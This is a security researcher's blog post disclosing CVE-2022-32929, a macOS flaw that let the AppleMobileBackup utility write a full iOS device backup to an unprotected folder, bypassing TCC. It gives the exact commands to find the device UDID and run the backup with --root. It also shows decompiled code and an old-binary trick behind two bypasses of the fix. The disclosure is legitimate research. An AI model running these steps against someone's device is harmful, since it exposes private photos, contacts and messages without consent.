<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="author" content="Csaba Fitzl">
    
    

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2022-32929 - Bypass iOS backup&#39;s TCC protection"/>
<meta name="twitter:description" content="Intro Normally, when a users backup their iOS device, the backup is saved into ~/Library/Application Support/MobileSync/Backup directory. The MobileSync directory is properly protected by TCC, as the backup can contain photos, contact information, everything from the iOS device, and it might be unencrypted, so this is a whole lot of private information. It&rsquo;s only accessible with Full Disk Access rights.
The issue is that an attacker can invoke the AppleMobileBackup utility and make a backup to a custom location."/>

    <meta property="og:title" content="CVE-2022-32929 - Bypass iOS backup&#39;s TCC protection" />
<meta property="og:description" content="Intro Normally, when a users backup their iOS device, the backup is saved into ~/Library/Application Support/MobileSync/Backup directory. The MobileSync directory is properly protected by TCC, as the backup can contain photos, contact information, everything from the iOS device, and it might be unencrypted, so this is a whole lot of private information. It&rsquo;s only accessible with Full Disk Access rights.
The issue is that an attacker can invoke the AppleMobileBackup utility and make a backup to a custom location." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://theevilbit.github.io/posts/cve-2022-32929/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-14T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-11-14T00:00:00+00:00" />



    
      <base href="https://theevilbit.github.io/posts/cve-2022-32929/">
    
    <title>
  CVE-2022-32929 - Bypass iOS backup&#39;s TCC protection · theevilbit blog
</title>

    
      <link rel="canonical" href="https://theevilbit.github.io/posts/cve-2022-32929/">
    

    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />

    
      
      
      <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.28d751104f30c16da1aa1bb04015cbe662cacfe0d1b01af4f2240ad58580069c.css" integrity="sha256-KNdREE8wwW2hqhuwQBXL5mLKz&#43;DRsBr08iQK1YWABpw=" crossorigin="anonymous" media="screen" />
    

    

    

    

    
    
    <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">

    <meta name="generator" content="Hugo 0.105.0">
  </head>

  <body class=" ">
    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="https://theevilbit.github.io/">
      theevilbit blog
    </a>
    <input type="checkbox" id="menu-toggle" />
    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
    <ul class="navigation-list">
      
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/posts/">Posts</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/shield/">Shield.app</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/beyond/">Beyond good ol&#39; LaunchAgents</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/tags/">Tags</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/categories/">Categories</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://theevilbit.github.io/about/">About</a>
          </li>
        
      
      
    </ul>
  </section>
</nav>


      <div class="content">
        
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">CVE-2022-32929 - Bypass iOS backup&#39;s TCC protection</h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fas fa-calendar"></i>
              <time datetime='2022-11-14T00:00:00Z'>
                November 14, 2022
              </time>
            </span>
            <span class="reading-time">
              <i class="fas fa-clock"></i>
              3 minutes read
            </span>
          </div>
          <div class="categories">
  <i class="fas fa-folder"></i>
    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>

          <div class="tags">
  <i class="fas fa-tag"></i>
    <a href="https://theevilbit.github.io/tags/macos/">macos</a>
      <span class="separator">•</span>
    <a href="https://theevilbit.github.io/tags/tcc/">tcc</a>
      <span class="separator">•</span>
    <a href="https://theevilbit.github.io/tags/vulnerability/">vulnerability</a>
      <span class="separator">•</span>
    <a href="https://theevilbit.github.io/tags/cve/">cve</a></div>

        </div>
      </header>

      <div>
        <h2 id="intro">Intro</h2>
<p>Normally, when a users backup their iOS device, the backup is saved into <code>~/Library/Application Support/MobileSync/Backup</code> directory. The <code>MobileSync</code> directory is properly protected by TCC, as the backup can contain photos, contact information, everything from the iOS device, and it might be unencrypted, so this is a whole lot of private information. It&rsquo;s only accessible with Full Disk Access rights.</p>
<p>The issue is that an attacker can invoke the <code>AppleMobileBackup</code> utility and make a backup to a custom location. Thus completely bypassing the protected backup location.</p>
<p>First, we need to find out the UDID of the connected iOS device, we can do this with the following one-liner:</p>
<pre tabindex="0"><code>system_profiler SPUSBDataType | sed -n -E -e &#39;/(iPhone|iPad)/,/Serial/s/ *Serial Number: *(.+)/\1/p&#39;
</code></pre><p>With my test iPhone 12 Pro connected I got the following:</p>
<pre tabindex="0"><code>csaby@mac ~ % system_profiler SPUSBDataType | sed -n -E -e &#39;/(iPhone|iPad)/,/Serial/s/ *Serial Number: *(.+)/\1/p&#39;            
2021-11-23 17:37:01.606 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.607 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.607 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.608 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.608 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.609 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
2021-11-23 17:37:01.610 system_profiler[87413:5503756] SPUSBDevice: IOCreatePlugInInterfaceForService failed 0xe00002be
AAAAAAAAXXXXXXXXXXXXXXXX
</code></pre><p>There are a few failures, but the last line is actually the UDID of the device, <code>AAAAAAAAXXXXXXXXXXXXXXXX</code> (note that this is obfuscated, this is not a real UDID).</p>
<p>Then we can make a backup:</p>
<pre tabindex="0"><code>/Library/Apple/System/Library/PrivateFrameworks/MobileDevice.framework/Versions/A/AppleMobileDeviceHelper.app/Contents/Resources/AppleMobileBackup -b --target &#34;AAAAAAAA-XXXXXXXXXXXXXXXX&#34; --root /tmp/
</code></pre><p>This will make a full backup, and we can access it, for example:</p>
<pre tabindex="0"><code>csaby@mac ~ % ls -l /tmp/AAAAAAAA-XXXXXXXXXXXXXXXX/00 
total 6792
-rw-r--r--  1 csaby  wheel    42057 Nov 23 17:41 00002e8b25129e2c7ca48f8e6fae558ae448b1d8
...
</code></pre><p>Apple initially fixed this by removing the <code>--root</code> option from <code>AppleMobileBackup</code>. I reported two bypasses, which they say it&rsquo;s fixed as well now, under the same CVE.</p>
<h3 id="bypass-1">Bypass 1</h3>
<p>Although I haven&rsquo;t done it, someone could reimplement the bug using the <code>/Library/Apple/System/Library/PrivateFrameworks/DeviceLink.framework/Versions/A/DeviceLink</code> framework, as it still has the function, called <code>_DLSetRootDirectory</code> to set the root directory.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">_DLSetRootDirectory</span>(<span style="color:#078;font-weight:bold">int</span> arg0, <span style="color:#078;font-weight:bold">int</span> arg1) {
</span></span><span style="display:flex;"><span>    r14 <span style="color:#555">=</span> arg1;
</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> arg0;
</span></span><span style="display:flex;"><span>    rdi <span style="color:#555">=</span> <span style="color:#555">*</span>(arg0 <span style="color:#555">+</span> <span style="color:#f60">0x98</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rdi <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            CFRelease(rdi);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(rbx <span style="color:#555">+</span> <span style="color:#f60">0x98</span>) <span style="color:#555">=</span> r14;
</span></span><span style="display:flex;"><span>    CFRetain(r14);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (_DLShouldLog(<span style="color:#f60">0x6</span>) <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            __DLLog(<span style="color:#c30">&#34;/AppleInternal/Library/BuildRoots/800759f9-1149-11ed-a6b7-ea36a6e2fcb9/Library/Caches/com.apple.xbs/Sources/DeviceLink/WireProtocol/DeviceLinkConnection.c&#34;</span>, <span style="color:#c30">&#34;DLSetRootDirectory&#34;</span>, <span style="color:#f60">0x6</span>, <span style="color:#c30">@&#34;DLSetRootDirectory(</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">%@</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">)&#34;</span>, r14, r9, stack[<span style="color:#f60">0</span>]);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objectivec" data-lang="objectivec"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">/* @class MBComputerManager2 */</span>
</span></span><span style="display:flex;"><span>-(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#c0f">backupWithTargetIdentifier:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">options:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
</span></span><span style="display:flex;"><span>    var_30 <span style="color:#555">=</span> arg3;
</span></span><span style="display:flex;"><span>    r13 <span style="color:#555">=</span> arg2;
</span></span><span style="display:flex;"><span>    r12 <span style="color:#555">=</span> <span style="color:#366">self</span>;
</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> <span style="color:#555">*</span>ivar_offset(_backupTargetIdentifier);
</span></span><span style="display:flex;"><span>    [<span style="color:#555">*</span>(<span style="color:#366">self</span> <span style="color:#555">+</span> rbx) <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(r12 <span style="color:#555">+</span> rbx) <span style="color:#555">=</span> [r13 <span style="color:#069;font-weight:bold">retain</span>];
</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> [NSMutableDictionary <span style="color:#99f">dictionaryWithCapacity</span>:<span style="color:#f60">0x0</span>];
</span></span><span style="display:flex;"><span>    r14 <span style="color:#555">=</span> rax;
</span></span><span style="display:flex;"><span>    [rax <span style="color:#99f">setObject</span>:<span style="color:#c30">@&#34;Backup&#34;</span> <span style="color:#99f">forKey</span>:<span style="color:#c30">@&#34;MessageName&#34;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (r13 <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            [r14 <span style="color:#99f">setObject</span>:r13 <span style="color:#99f">forKey</span>:<span style="color:#c30">@&#34;TargetIdentifier&#34;</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> var_30;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (rbx <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>            [r14 <span style="color:#99f">setObject</span>:rbx <span style="color:#99f">forKey</span>:<span style="color:#c30">@&#34;Options&#34;</span>];
</span></span><span style="display:flex;"><span>            rax <span style="color:#555">=</span> [rbx <span style="color:#99f">objectForKey</span>:<span style="color:#c30">@&#34;RootDirectory&#34;</span>];
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span> (rax <span style="color:#555">!=</span> <span style="color:#f60">0x0</span>) {
</span></span><span style="display:flex;"><span>                    [r12 <span style="color:#99f">setRootDirectory</span>:rax];
</span></span><span style="display:flex;"><span>                    DLEnsureDirectoryExists(rax);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    var_38 <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
</span></span><span style="display:flex;"><span>    [r12 <span style="color:#99f">_sendMessage</span>:r14 <span style="color:#99f">error</span>:<span style="color:#555">&amp;</span>var_38];
</span></span><span style="display:flex;"><span>    rbx <span style="color:#555">=</span> <span style="color:#555">*</span>ivar_offset(_backupTargetIdentifier);
</span></span><span style="display:flex;"><span>    [<span style="color:#555">*</span>(r12 <span style="color:#555">+</span> rbx) <span style="color:#069;font-weight:bold">release</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(r12 <span style="color:#555">+</span> rbx) <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
</span></span><span style="display:flex;"><span>    rax <span style="color:#555">=</span> sub_100008c92(var_38);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> rax;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="bypass-2">Bypass 2</h3>
<p>The other option was to copy the binary from Monterey and simply run it on Ventura Beta 5. It still works as it has the <code>--root</code> option, and wasn&rsquo;t disallowed in AMFI.</p>
<pre tabindex="0"><code>csaby@csabys-Mac ~ % ./AppleMobileDeviceHelper.app/Contents/Resources/AppleMobileBackup -b --target &#34;AAAAAAAA-XXXXXXXXXXXXXXXX&#34; --root /tmp/
csaby@csabys-Mac ~ % sw_vers 
ProductName:		macOS
ProductVersion:		13.0
BuildVersion:		22A5321d
csaby@csabys-Mac ~ % shasum ./AppleMobileDeviceHelper.app/Contents/Resources/AppleMobileBackup
05554a5309bee93182dc7e876f51036fa107413b  ./AppleMobileDeviceHelper.app/Contents/Resources/AppleMobileBackup
csaby@csabys-Mac ~ % ls -l /private/tmp 
total 0
drwxr-xr-x  260 csaby  wheel  8320 Aug 11 14:42 AAAAAAAA-XXXXXXXXXXXXXXXX
</code></pre><h3 id="fix">Fix</h3>
<p>I didn&rsquo;t verify how Apple fixed this at the end, but CVE-2022-32929 is only reported for iOS devices, and based on the following Twitter thread they might have decided to do something on the iOS end rather than on macOS. Apple asks the passcode now for every single backup. This is unfortunate, as this was an issue related to macOS, and it sounds like Apple have broken some functionality by making backups much harder on iOS.</p>
<p><a href="https://twitter.com/j_obermayr/status/1591347615618453504">https://twitter.com/j_obermayr/status/1591347615618453504</a></p>

      </div>

      <footer>
        


        
      </footer>
    </article>

    
  </section>

      </div>

      <footer class="footer">
  <section class="container">
    
     © 2022
    
       · 
      Blog created by <a href="https://twitter.com/theevilbit">@theevilbit</a>.
    
    
  </section>
</footer>

    </main>

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	ga('create', 'UA-151008930-1', 'auto');
	
	ga('send', 'pageview');
}
</script>

  </body>

</html>
